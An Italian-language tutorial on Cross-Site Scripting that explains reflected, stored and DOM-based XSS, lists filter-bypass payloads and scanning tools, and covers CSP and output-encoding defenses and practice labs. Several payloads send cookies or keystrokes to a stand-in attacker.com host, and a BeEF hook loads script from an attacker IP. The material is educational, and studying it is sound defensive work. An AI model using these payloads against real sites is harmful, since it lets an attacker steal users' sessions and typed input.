# Cross-Site Scripting (XSS): iniettare codice nei browser altrui

## Introduzione

**XSS** — Cross-Site Scripting — è una vulnerabilità web che permette a un attaccante di iniettare codice JavaScript malevolo in pagine web visualizzate da altri utenti.

A differenza della SQL Injection, che attacca il server, l'XSS attacca **il browser della vittima**. Il tuo codice viene eseguito nel contesto del sito legittimo — con tutti i permessi che quel sito ha.

---

## Perché è pericoloso

Con XSS puoi:

- **Rubare cookie di sessione** → impersonare l'utente
- **Keylogging** → registrare tutto quello che l'utente digita
- **Reindirizzare l'utente** → phishing, download malware
- **Modificare la pagina** → defacement, falsi form di login
- **Fare richieste autenticate** → CSRF amplificato
- **Port scanning interno** → sfruttare il browser come pivot

---

## Tipi di XSS

### Reflected XSS

Il payload viene incluso in una richiesta HTTP (es. parametro GET) e viene "riflesso" nella risposta. Non viene salvato sul server.

```
https://target.com/search?q=<script>alert('XSS')</script>
```

Se la pagina mostra il termine di ricerca senza sanitizzarlo, il codice viene eseguito.

**Vettore d'attacco:** link malevolo inviato alla vittima tramite email, messaggio, ecc.

### Stored XSS (Persistent)

Il payload viene salvato nel database e viene servito a tutti gli utenti che visitano quella pagina. Il più pericoloso.

**Esempio:** campo commento di un blog, campo "bio" del profilo, messaggi in una chat.

```html
<!-- Attaccante inserisce come commento: -->
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

<!-- Ogni utente che legge i commenti esegue questo codice -->
```

### DOM-based XSS

Il payload non passa dal server — viene processato direttamente dal JavaScript della pagina nel browser.

```javascript
// Codice vulnerabile nella pagina:
document.getElementById("output").innerHTML = location.hash.substring(1);

// URL malevolo:
https://target.com/page#<img src=x onerror=alert('XSS')>
```

---

## Trovare XSS: dove testare

Ogni punto in cui l'applicazione mostra input dell'utente è un potenziale punto di injection:

- Campi di ricerca
- Form (login, registrazione, commenti, bio)
- Parametri URL
- Header HTTP riflessi nella risposta (User-Agent, Referer)
- Messaggi di errore che ripetono l'input

---

## Payload di base

### Test iniziale

```html
<script>alert(1)</script>
```

Se appare un popup, hai XSS. Semplice, visibile, usato solo per verifica.

### Esfiltrazione cookie

```html
<script>
  new Image().src = "https://attacker.com/steal?c=" + document.cookie;
</script>
```

### Keylogger base

```html
<script>
  document.addEventListener('keyup', function(e) {
    new Image().src = "https://attacker.com/keys?k=" + e.key;
  });
</script>
```

### Redirect

```html
<script>document.location = "https://evil.com"</script>
```

---

## Bypass di filtri comuni

Le applicazioni spesso cercano di filtrare `<script>`. Esistono decine di bypass:

```html
<!-- Tag alternativi -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- Maiuscole/minuscole (per filtri semplici) -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding HTML -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- JavaScript URI -->
<a href="javascript:alert(1)">click</a>

<!-- Event handlers senza script -->
<div onmouseover="alert(1)">hover me</div>
```

---

## XSS Tool: XSStrike e Dalfox

Per automatizzare la ricerca di XSS:

```bash
# XSStrike
pip install xsstrike
xsstrike -u "http://target.com/search?q=test"

# Dalfox (veloce, moderno)
dalfox url "http://target.com/search?q=test"

# Con Burp Suite
# Usa Burp Intruder o l'extension "XSS Validator"
```

---

## BeEF: Browser Exploitation Framework

**BeEF** porta l'XSS a un livello superiore. Una volta che inietti il suo hook JavaScript nel browser di una vittima, ottieni una console di controllo completa.

```bash
# Avvio su Kali
sudo beef-xss

# Payload da iniettare nella pagina vulnerabile
<script src="http://TUO_IP:3000/hook.js"></script>
```

Da BeEF puoi eseguire centinaia di moduli: scan della rete interna, keylogging, screenshot, redirect, social engineering e molto altro.

---

## Difendersi da XSS

### Content Security Policy (CSP)

Il meccanismo di difesa più efficace. Dici al browser da dove può caricare script.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.fidata.com
```

Con una CSP strict, anche se inietti JavaScript, il browser non lo eseguirà.

### Output encoding

Ogni output verso HTML deve essere encodato:

```php
// PHP
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// JavaScript (non mettere mai input utente direttamente in innerHTML)
element.textContent = userInput;  // sicuro
element.innerHTML = userInput;    // vulnerabile
```

### Validazione input

Non fidarti mai dell'input. Accetta solo ciò che ti aspetti, rifiuta il resto.

---

## Dove esercitarsi

- **XSS Game di Google** — `xss-game.appspot.com` — progressivo, ottimo per iniziare
- **PortSwigger Web Security Academy** — lab gratuiti su XSS, i migliori in assoluto
- **DVWA** — livelli low/medium/high per XSS reflected e stored
- **HackTheBox** — macchine web con XSS realistici

---

## Conclusione

XSS è spesso sottovalutato dai principianti — "è solo un alert()". Ma nella realtà, XSS stored su un'applicazione usata da migliaia di persone permette di compromettere tutti i loro account in un colpo solo.

La chiave per capirlo davvero è esercitarsi: trova dove finisce l'input utente nella pagina, capisce come viene processato, e trova il modo per farlo eseguire.
